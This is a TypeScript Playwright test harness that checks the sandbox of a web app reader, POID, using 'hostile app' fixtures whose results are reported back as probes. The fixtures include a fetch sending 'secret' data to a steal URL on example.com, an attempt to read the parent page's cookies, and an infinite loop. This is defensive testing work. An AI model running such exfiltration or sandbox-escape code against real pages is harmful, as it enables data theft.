/**
 * Browser harness for the Playwright tier. Bundled to an IIFE and loaded into
 * a real Chromium page; the spec drives it via `window.PoidHarness`.
 *
 * Each hostile app is a single-file document that attempts one attack and
 * reports the outcome to the parent via a `{ probe }` message — a channel
 * separate from the POID bridge (which ignores anything without `poid: 1`).
 */

import type { Capability } from "@poid/sdk";
import type { ConsentManifest } from "@poid/ui";
import { mountReader, type ReaderHandle } from "../src/index.js";

// Injected at bundle time: the @poid/sdk sandbox bootstrap, minified to an IIFE.
declare const __SDK_SOURCE__: string;

const HOSTILE_APPS: Record<string, string> = {
  // fetch() to any origin must be blocked by CSP (connect-src 'none'), not by
  // the SDK. The app has no poid.net (network not granted) and tries raw fetch.
  fetch: `<!doctype html><html><body><script>
    (async () => {
      try {
        await fetch("https://example.com/steal?data=secret");
        parent.postMessage({ probe: "fetch", blocked: false }, "*");
      } catch (e) {
        parent.postMessage({ probe: "fetch", blocked: true, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,

  // Escaping the sandbox: reading parent/top cross-origin must throw.
  escape: `<!doctype html><html><body><script>
    let blocked = false, detail = "";
    try { void parent.document.cookie; detail = "read parent.document"; }
    catch (e) { blocked = true; detail = String(e); }
    try { void top.location.href; } catch (e) { blocked = true; }
    parent.postMessage({ probe: "escape", blocked, detail }, "*");
  </script></body></html>`,

  // An app that hangs its event loop after load: the watchdog must trip.
  loop: `<!doctype html><html><body><script>
    parent.postMessage({ probe: "loop-start" }, "*");
    setTimeout(() => { while (true) {} }, 30);
  </script></body></html>`,

  // Positive control: the whole stack (bootstrap → bridge → broker → engine)
  // works in a real browser and a kv round-trip succeeds.
  good: `<!doctype html><html><body><script type="module">
    (async () => {
      try {
        await poid.db.kv.set("note", "hello");
        const v = await poid.db.kv.get("note");
        parent.postMessage({ probe: "kv", ok: v === "hello", value: v }, "*");
      } catch (e) {
        parent.postMessage({ probe: "kv", ok: false, detail: String(e) }, "*");
      }
    })();
  </script></body></html>`,
};

interface Probe {
  probe: string;
  [k: string]: unknown;
}

const probes: Probe[] = [];
window.addEventListener("message", (ev) => {
  const d = ev.data as { probe?: unknown };
  if (d && typeof d === "object" && typeof d.probe === "string") probes.push(d as Probe);
});

let current: ReaderHandle | undefined;

function stage(): HTMLElement {
  let s = document.getElementById("stage");
  if (!s) {
    s = document.createElement("div");
    s.id = "stage";
    document.body.append(s);
  }
  return s;
}

function manifest(): ConsentManifest & { instanceId: string; storageMode: "embedded" } {
  return {
    name: "Hostile Fixture",
    version: "1.0.0",
    author: "Attacker",
    signature: "none",
    instanceId: "instance-hostile",
    storageMode: "embedded",
    permissions: {
      network: [],
      filesystem: "none",
      clipboard: false,
      print: false,
      notifications: false,
      mcp: [],
    },
  };
}

interface MountArgs {
  kind: string;
  watchdog?: { intervalMs: number; timeoutMs: number };
}

const PoidHarness = {
  // Kicks off the mount (which synchronously renders consent) but does NOT
  // await the consent decision — the spec clicks Run/Cancel separately.
  mount(args: MountArgs): void {
    probes.length = 0;
    current = undefined;
    const html = HOSTILE_APPS[args.kind];
    if (!html) throw new Error(`unknown hostile app ${args.kind}`);
    const files = new Map<string, Uint8Array>([["app/index.html", new TextEncoder().encode(html)]]);
    const capabilities: Capability[] = ["app", "db.kv", "db.docs", "db.slots", "ui", "export"];
    void mountReader({
      container: stage(),
      files,
      entry: "app/index.html",
      manifest: manifest(),
      capabilities,
      sdkSource: __SDK_SOURCE__,
      watchdog: args.watchdog,
    }).then((handle) => {
      current = handle;
    });
  },
  run(): void {
    document.querySelector<HTMLButtonElement>(".poid-consent__run")?.click();
  },
  cancel(): void {
    document.querySelector<HTMLButtonElement>(".poid-consent__cancel")?.click();
  },
  stop(): void {
    current?.stop();
  },
  probes(): Probe[] {
    return probes;
  },
  hasConsent(): boolean {
    return !!document.querySelector(".poid-consent");
  },
  hasIframe(): boolean {
    return !!stage().querySelector("iframe");
  },
  iframeSandbox(): string | null {
    return stage().querySelector("iframe")?.getAttribute("sandbox") ?? null;
  },
  isUnresponsive(): boolean {
    return !!document.querySelector(".poid-chrome--unresponsive");
  },
};

(window as unknown as { PoidHarness: typeof PoidHarness }).PoidHarness = PoidHarness;
